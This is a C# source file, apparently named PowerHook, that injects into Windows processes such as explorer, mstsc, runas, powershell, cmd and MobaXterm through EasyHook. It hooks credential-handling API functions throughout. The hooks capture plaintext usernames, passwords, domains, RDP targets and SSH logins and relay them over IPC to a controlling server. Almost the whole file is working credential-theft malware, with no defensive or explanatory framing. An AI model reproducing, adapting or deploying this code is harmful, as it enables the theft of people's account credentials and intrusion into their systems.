
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerHook
{

    public class InjectionEntryPoint : EasyHook.IEntryPoint
    {


        // flags
        public enum CRED_TYPE : uint
        {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,      // Maximum supported cred type
            MAXIMUM_EX = (MAXIMUM + 1000),  // Allow new applications to run on old OSes
        }

        public enum CRED_PERSIST : uint
        {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CREDENTIAL_ATTRIBUTE
        {
            string Keyword;
            uint Flags;
            uint ValueSize;
            IntPtr Value;
        }

        //This type is deliberately not designed to be marshalled.
        public class Credential
        {
            public UInt32 Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public byte[] CredentialBlob;
            public CRED_PERSIST Persist;
            public CREDENTIAL_ATTRIBUTE[] Attributes;
            public string TargetAlias;
            public string UserName;
        }

        /// <summary>
        ///
        /// </summary>
        public class CredentialInMarshaler : ICustomMarshaler
        {
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            private class NATIVECREDENTIAL
            {
                public UInt32 Flags;
                public CRED_TYPE Type;
                public string TargetName;
                public string Comment;
                public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
                public UInt32 CredentialBlobSize;
                public IntPtr CredentialBlob;
                public CRED_PERSIST Persist;
                public UInt32 AttributeCount;
                public IntPtr Attributes;
                public string TargetAlias;
                public string UserName;
            }

            public void CleanUpManagedData(object ManagedObj)
            {
                // Nothing to do since all data can be garbage collected.
            }
            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool CredFree([In] IntPtr buffer);
            public void CleanUpNativeData(IntPtr pNativeData)
            {
                if (pNativeData == IntPtr.Zero)
                {
                    return;
                }
                CredFree(pNativeData);
            }

            public int GetNativeDataSize()
            {
                throw new NotImplementedException();
            }

            public IntPtr MarshalManagedToNative(object obj)
            {
                throw new NotImplementedException();
            }

            public object MarshalNativeToManaged(IntPtr pNativeData)
            {
                if (pNativeData == IntPtr.Zero)
                {
                    return null;
                }

                NATIVECREDENTIAL lRawCredential = (NATIVECREDENTIAL)Marshal.PtrToStructure(pNativeData, typeof(NATIVECREDENTIAL));

                Credential lCredential = new Credential()
                {
                    UserName = lRawCredential.UserName,
                    TargetName = lRawCredential.TargetName,
                    TargetAlias = lRawCredential.TargetAlias,
                    Persist = lRawCredential.Persist,
                    Comment = lRawCredential.Comment,
                    Flags = lRawCredential.Flags,
                    LastWritten = lRawCredential.LastWritten,
                    Type = lRawCredential.Type,
                    CredentialBlob = new byte[lRawCredential.CredentialBlobSize],
                    Attributes = new CREDENTIAL_ATTRIBUTE[lRawCredential.AttributeCount]
                };

                Marshal.Copy(lRawCredential.CredentialBlob, lCredential.CredentialBlob, 0, (int)lRawCredential.CredentialBlobSize);

                return lCredential;
            }

            public static ICustomMarshaler GetInstance(string cookie)
            {
                return new CredentialInMarshaler();
            }
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Buffer;
        }


        [Flags]
        enum CreationFlags
        {
            CREATE_SUSPENDED = 0x00000004,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        }

        [Flags]
        enum LogonFlags
        {
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public int cb;
            public String reserved;
            public String desktop;
            public String title;
            public int x;
            public int y;
            public int xSize;
            public int ySize;
            public int xCountChars;
            public int yCountChars;
            public int fillAttribute;
            public int flags;
            public UInt16 showWindow;
            public UInt16 reserved2;
            public byte reserved3;
            public IntPtr stdInput;
            public IntPtr stdOutput;
            public IntPtr stdError;
        }
        // End flags



        /// <summary>
        /// Reference to the server interface
        /// </summary>
        ServerInterface _server = null;

        /// <summary>
        /// Message queue of all files accessed
        /// </summary>
        Queue<string> _messageQueue = new Queue<string>();

        /// <summary>
        /// EasyHook requires a constructor that matches <paramref name="context"/> and any additional parameters as provided
        /// in the original call to <see cref="EasyHook.RemoteHooking.Inject(int, EasyHook.InjectionOptions, string, string, object[])"/>.
        /// 
        /// Multiple constructors can exist on the same <see cref="EasyHook.IEntryPoint"/>, providing that each one has a corresponding Run method (e.g. <see cref="Run(EasyHook.RemoteHooking.IContext, string)"/>).
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        /// 

        public InjectionEntryPoint(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Connect to server object using provided channel name
            _server = EasyHook.RemoteHooking.IpcConnectClient<ServerInterface>(channelName);

            // If Ping fails then the Run method will be not be called
            _server.Ping();
        }
        //Need LoadLibrary to import dpapi.dll in case it hasn't been imported yet
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);
        /// <summary>
        /// The main entry point for our logic once injected within the target process. 
        /// This is where the hooks will be created, and a loop will be entered until host process exits.
        /// EasyHook requires a matching Run method for the constructor
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        public void Run(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Injection is now complete and the server interface is connected
            _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());

            //Get the current process so we will hook the right function
            var currentProcess = System.Diagnostics.Process.GetCurrentProcess().ProcessName;


            //Install hooks
            if (currentProcess == "explorer" || currentProcess == "mstsc")
            {
                //Hooks graphical runas and mstsc (both use the same function)
                LoadLibrary("Credui.dll");
                var CredUnPackAuthenticationBufferW = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Credui.dll", "CredUnPackAuthenticationBufferW"),
                new CredUnPackAuthenticationBufferW_Delegate(CredUnPackAuthenticationBufferW_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CredUnPackAuthenticationBufferW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });

                //Used to give us the target url from mstsc
                LoadLibrary("Advapi32.dll");
                var CredReadW = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CredReadW"),
                new CredReadW_Delegate(CredReadW_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CredReadW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }

             if (currentProcess == "runas" || currentProcess == "powershell")
            {
                // RunAs hook function
                LoadLibrary("Advapi32.dll");
                var CreateProcessWithLogonW = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CreateProcessWithLogonW"),
                new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
                    
            
            if (currentProcess == "MobaXterm")
            {
                //MobaXterm hook function
                LoadLibrary("user32.dll");
                var CreateCharUpperBuffA = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("user32.dll", "CharUpperBuffA"),
                new CharUpperBuffA_Delegate(CharUpperBuffA_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateCharUpperBuffA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
                
            if (currentProcess == "cmd")
            {
                //cmd hook function
                LoadLibrary("ntdll.dll");
                var CreateRtlInitUnicodeStringEx = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("ntdll.dll", "RtlInitUnicodeStringEx"),
                new RtlInitUnicodeStringEx_Delegate(RtlInitUnicodeStringEx_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateRtlInitUnicodeStringEx.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }


          

            // Wake up the process (required if using RemoteHooking.CreateAndInject)
            EasyHook.RemoteHooking.WakeUpProcess();

            try
            {
                // Loop until program closes (i.e. IPC fails)
                while (true)
                {
                    System.Threading.Thread.Sleep(500);

                    string[] queued = null;

                    lock (_messageQueue)
                    {
                        queued = _messageQueue.ToArray();
                        _messageQueue.Clear();
                    }

                    // Send newly monitored file accesses to server
                    if (queued != null && queued.Length > 0)
                    {
                        
                        _server.ReportMessages(queued);
                    }
                    else
                    {
                        _server.Ping();
                    }
                }
            }
            catch
            {
                // Ping() or ReportMessages() will raise an exception if host is unreachable
            }
         
            // Finalise cleanup of hooks
            EasyHook.LocalHook.Release();
        }



        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool CredReadW_Delegate(string target, CRED_TYPE type, int reservedFlag, [MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);
        [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CredReadW(string target, CRED_TYPE type, int reservedFlag,[MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);


        bool CredReadW_Hook(
            string target, 
            CRED_TYPE type, 
            int reservedFlag, 
            [MarshalAs(UnmanagedType.CustomMarshaler, 
            MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential)
        {
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {

                        String Data = target;
                        string date = DateTime.Now.ToString();
                        if (Data.Contains("target="))
                        {
                            this._messageQueue.Enqueue(
                                string.Format("[+] [{0}] Found Potential RDP url --> {1}", date, Data));
                        }
                           


                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return CredReadW(target, type, reservedFlag,out credential);
        }


        // MSTSC+Graphical Runas
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        delegate bool CredUnPackAuthenticationBufferW_Delegate(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
        [DllImport("Credui.dll", CharSet = CharSet.Auto)]
        static extern bool CredUnPackAuthenticationBufferW(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);

        bool CredUnPackAuthenticationBufferW_Hook(
           int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword)
        {
            
            try
            {
                
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {

                        bool success = CredUnPackAuthenticationBufferW(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainame, pszPassword, ref pcchMaxPassword);
                        string date = DateTime.Now.ToString();
                        this._messageQueue.Enqueue(
                        string.Format("[+] [{0}] Found UAC/RDP Login --> Username: {1}, Password: {2}",date, pszUserName, pszPassword)); 
                        return success;

                    }
                }
                
                
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return false;
        }


        //CMD
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
        [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
        static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);


        bool RtlInitUnicodeStringEx_Hook(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)] String SourceString)
        {
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {
                        string date = DateTime.Now.ToString();
                        String Data =  SourceString;
                        if (Data.Contains("-p"))
                        {
                            this._messageQueue.Enqueue(
                            string.Format("[+] [{0}] Found cmd data --> {1}", date, Data));

                        }


                    }
                }
           }
           catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return RtlInitUnicodeStringEx(ref DestinationString, SourceString);
        }


        //MobaXterm
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
        delegate bool CharUpperBuffA_Delegate(string lpsz, UInt32 cchLength);
        [DllImport("user32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        static extern bool CharUpperBuffA(
            string lpsz,
            UInt32 cchLength);

        bool CharUpperBuffA_Hook(
        string lpsz,
        UInt32 cchLength)
        {
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        string date = DateTime.Now.ToString();
                        string Data = lpsz;
                        if (Data.Contains("rdp:"))
                        {
                            this._messageQueue.Enqueue(
                            string.Format("[+] [{0}] Found MobaXterm RDP Login --> {1}", date, Data));
                        }
                        if (Data.Contains(", 22 ,"))
                        {
                            this._messageQueue.Enqueue(
                            string.Format("[+] [{0}] Found MobaXterm SSH Login --> {1}", date, Data));
                        }

                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return CharUpperBuffA(lpsz, cchLength);
        }


        //RUNAS
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool CreateProcessWithLogonW_Delegate(String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithLogonW(
           String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);

        bool CreateProcessWithLogonW_Hook(
            String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation)

        {
        
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        string date = DateTime.Now.ToString();
                        var Domain = domain;
                        var username = userName;
                        var Password = password;
                        var CommandLine = commandLine;


                        this._messageQueue.Enqueue(
                            string.Format("[+] [{0}] Found Runas Creds --> Username: {1}, Password: {2}, Domain: {3}, Executed: {4}", date, username, Password, Domain, CommandLine));
                        
                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }

           
            return CreateProcessWithLogonW(userName, domain, password, logonFlags, applicationName, commandLine,creationFlags,environment, currentDirectory,ref startupInfo,out processInformation);
        }
    }
}
